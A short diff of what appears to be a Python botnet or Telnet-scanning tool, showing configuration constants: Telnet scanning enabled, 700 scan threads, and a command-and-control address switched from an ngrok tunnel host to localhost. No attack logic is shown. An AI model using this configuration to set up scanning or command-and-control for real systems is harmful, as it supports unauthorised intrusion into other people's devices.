@@ -4,8 +4,8 @@ import threading, socket, time
 __SCAN_TELNET__ = True
 __SCAN_THREAD__ = 700
 
-__CNC_ADDR__ = '0.tcp.ngrok.io'
-__CNC_PORT__ = 19619
+__CNC_ADDR__ = '127.0.0.1'
+__CNC_PORT__ = 36834
 
 class Data:
     def __init__(self):
